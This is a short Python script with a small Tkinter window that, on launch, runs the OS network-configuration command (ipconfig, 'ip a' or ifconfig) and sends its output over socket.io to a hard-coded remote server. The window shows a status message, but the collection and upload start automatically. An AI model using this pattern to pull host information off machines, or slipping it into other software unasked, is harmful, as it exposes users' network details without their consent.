import tkinter as tk
import socketio
import subprocess
import platform

sio = socketio.Client()

def get_ip_config():
    system = platform.system()
    try:
        if system == "Windows":
            # Windows
            result = subprocess.check_output("ipconfig", shell=True, text=True)
        elif system == "Linux":
            # Linux
            result = subprocess.check_output("ip a", shell=True, text=True)
        elif system == "Darwin":
            # macOS
            result = subprocess.check_output("ifconfig", shell=True, text=True)
        else:
            result = f"Unsupported OS: {system}"
    except Exception as e:
        result = f"Error running IP config command: {e}"
    return result

def connect_and_send():
    try:
        sio.connect('https://backfisch-production.up.railway.app')  # <-- Replace with your deployed URL
        ipconfig_output = get_ip_config()
        sio.emit('send_message', {'message': ipconfig_output})
        status_label.config(text="Sent IP config output")
    except Exception as e:
        status_label.config(text=f"Error: {e}")

root = tk.Tk()
root.title("IP Config Sender")

status_label = tk.Label(root, text="Connecting...")
status_label.pack(pady=20)

root.after(100, connect_and_send)

root.mainloop()
